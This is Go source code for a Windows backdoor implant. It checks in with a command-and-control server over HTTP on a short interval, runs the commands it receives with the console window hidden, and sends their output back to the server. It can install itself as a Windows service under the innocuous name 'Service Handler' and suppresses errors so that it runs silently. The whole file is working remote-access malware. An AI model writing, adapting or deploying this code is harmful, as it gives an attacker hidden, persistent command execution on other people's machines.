package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"syscall"
	"time"

	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/debug"
	"golang.org/x/sys/windows/svc/eventlog"
	"golang.org/x/sys/windows/svc/mgr"
)

// Command represents a command from the C2 server
type Command struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

// Response represents the response sent to the C2 server
type Response struct {
	ID       string `json:"id"`
	Output   string `json:"output"`
	Error    string `json:"error,omitempty"`
	ExitCode int    `json:"exit_code"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}

// Implant represents the reverse shell client
type Implant struct {
	C2URL     string
	Interval  time.Duration
	Client    *http.Client
	Hostname  string
	OS        string
}

// NewImplant creates a new implant instance
func NewImplant(c2URL string, interval time.Duration) (*Implant, error) {
	hostname, _ := os.Hostname()
	osInfo := runtime.GOOS

	return &Implant{
		C2URL:    c2URL,
		Interval: interval,
		Client: &http.Client{
			Timeout: 30 * time.Second,
		},
		Hostname: hostname,
		OS:       osInfo,
	}, nil
}

// ExecuteCommand executes a shell command and returns the output
func (i *Implant) ExecuteCommand(cmd string) (string, string, int) {
	var shell string
	var flag string

	if runtime.GOOS == "windows" {
		shell = "cmd"
		flag = "/c"
	} else {
		shell = "/bin/sh"
		flag = "-c"
	}

	command := exec.Command(shell, flag, cmd)
	var stdout, stderr bytes.Buffer
	command.Stdout = &stdout
	command.Stderr = &stderr

	// Hide window on Windows
	if runtime.GOOS == "windows" {
		command.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
	}

	err := command.Run()
	exitCode := 0
	if err != nil {
		if exitError, ok := err.(*exec.ExitError); ok {
			exitCode = exitError.ExitCode()
		} else {
			exitCode = -1
		}
	}

	return stdout.String(), stderr.String(), exitCode
}

// CheckIn sends a check-in request to the C2 server and processes commands
func (i *Implant) CheckIn() error {
	// Prepare check-in data
	checkInData := map[string]interface{}{
		"hostname": i.Hostname,
		"os":       i.OS,
		"status":   "alive",
		"time":     time.Now().Unix(),
	}

	jsonData, err := json.Marshal(checkInData)
	if err != nil {
		return fmt.Errorf("failed to marshal check-in data: %v", err)
	}

	// Send POST request to C2 server
	resp, err := i.Client.Post(i.C2URL+"/checkin", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to connect to C2 server: %v", err)
	}
	defer resp.Body.Close()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response: %v", err)
	}

	// Check if there's a command to execute
	if len(body) > 0 && resp.StatusCode == http.StatusOK {
		var cmd Command
		if err := json.Unmarshal(body, &cmd); err == nil && cmd.Command != "" {
			// Execute the command
			stdout, stderr, exitCode := i.ExecuteCommand(cmd.Command)

			// Prepare response
			response := Response{
				ID:       cmd.ID,
				Output:   stdout,
				Error:    stderr,
				ExitCode: exitCode,
				Hostname: i.Hostname,
				OS:       i.OS,
			}

			// Send command output back to C2 server
			responseData, _ := json.Marshal(response)
			i.Client.Post(i.C2URL+"/output", "application/json", bytes.NewBuffer(responseData))
		}
	}

	return nil
}

// Run starts the implant's main loop
func (i *Implant) Run(stopChan <-chan struct{}) {
	// Silent mode - no console output
	ticker := time.NewTicker(i.Interval)
	defer ticker.Stop()

	// Initial check-in
	if err := i.CheckIn(); err != nil {
		// Silently retry on next interval
	}

	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			if err := i.CheckIn(); err != nil {
				// Silently retry on next interval
			}
		}
	}
}

// ServiceHandler implements the Windows service interface
type ServiceHandler struct {
	implant *Implant
	logger  *eventlog.Log
}

// Execute implements the svc.Service interface
func (s *ServiceHandler) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (svcSpecificEC bool, exitCode uint32) {
	changes <- svc.Status{State: svc.StartPending}

	// Create stop channel for implant
	stopChan := make(chan struct{})

	// Start implant in a goroutine
	go func() {
		s.implant.Run(stopChan)
	}()

	changes <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}

	// Handle service control requests
	for {
		select {
		case c := <-r:
			switch c.Cmd {
			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.StopPending}
				close(stopChan)
				changes <- svc.Status{State: svc.Stopped}
				return false, 0
			case svc.Interrogate:
				changes <- c.CurrentStatus
			default:
				// Ignore other commands
			}
		}
	}
}

func runService(name string, isDebug bool) error {
	// Default C2 server URL - can be overridden via environment variable
	c2URL := os.Getenv("C2_URL")
	if c2URL == "" {
		c2URL = "http://localhost:5455"
	}

	// Default check-in interval - can be overridden via environment variable
	interval := 5 * time.Second
	if intervalStr := os.Getenv("INTERVAL"); intervalStr != "" {
		if parsed, err := time.ParseDuration(intervalStr); err == nil {
			interval = parsed
		}
	}

	implant, err := NewImplant(c2URL, interval)
	if err != nil {
		return fmt.Errorf("failed to create implant: %v", err)
	}

	var logger *eventlog.Log
	if !isDebug {
		var err error
		logger, err = eventlog.Open(name)
		if err != nil {
			// Event log registration may fail - continue without it for silent operation
			// The service will still function without event logging
		} else {
			defer logger.Close()
		}
	}

	handler := &ServiceHandler{
		implant: implant,
		logger:  logger,
	}

	if isDebug {
		return debug.Run(name, handler)
	}

	return svc.Run(name, handler)
}

func main() {
	// Check if running on Windows
	if runtime.GOOS != "windows" {
		log.Fatal("This program only runs on Windows")
	}

	// Service name
	serviceName := "ServiceHandler"

	// Check if we're running as a service
	isService, err := svc.IsWindowsService()
	if err != nil {
		log.Fatalf("Failed to determine if running as service: %v", err)
	}

	if isService {
		// Run as service
		if err := runService(serviceName, false); err != nil {
			log.Fatalf("Service failed: %v", err)
		}
	} else {
		// Check command line arguments
		if len(os.Args) > 1 {
			switch os.Args[1] {
			case "install":
				// Install the service
				exePath, err := filepath.Abs(os.Args[0])
				if err != nil {
					log.Fatalf("Failed to get executable path: %v", err)
				}

				// Open service control manager
				m, err := mgr.Connect()
				if err != nil {
					log.Fatalf("Failed to open service control manager: %v", err)
				}
				defer m.Disconnect()

				// Check if service already exists
				s, err := m.OpenService(serviceName)
				if err == nil {
					s.Close()
					log.Printf("Service %s already exists. Use 'uninstall' first to remove it.", serviceName)
					return
				}

				// Create service
				s, err = m.CreateService(serviceName, exePath, mgr.Config{
					DisplayName: "Service Handler",
					Description: "Service Handler for implant management",
					StartType:   mgr.StartManual,
				})
				if err != nil {
					log.Fatalf("Failed to create service: %v", err)
				}
				defer s.Close()

				log.Printf("Service %s installed successfully", serviceName)
				return

			default:
				log.Printf("no", os.Args[0])
				return
			}
		} else {
			// Run normally (not as service)
			// Default C2 server URL - can be overridden via environment variable
			c2URL := os.Getenv("C2_URL")
			if c2URL == "" {
				c2URL = "http://localhost:5455"
			}

			// Default check-in interval - can be overridden via environment variable
			interval := 5 * time.Second
			if intervalStr := os.Getenv("INTERVAL"); intervalStr != "" {
				if parsed, err := time.ParseDuration(intervalStr); err == nil {
					interval = parsed
				}
			}

			implant, err := NewImplant(c2URL, interval)
			if err != nil {
				log.Fatalf("Failed to create implant: %v", err)
			}

			// Handle Ctrl+C gracefully
			stopChan := make(chan struct{})
			sigChan := make(chan os.Signal, 1)
			signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

			go func() {
				<-sigChan
				close(stopChan)
			}()

			implant.Run(stopChan)
		}
	}
}
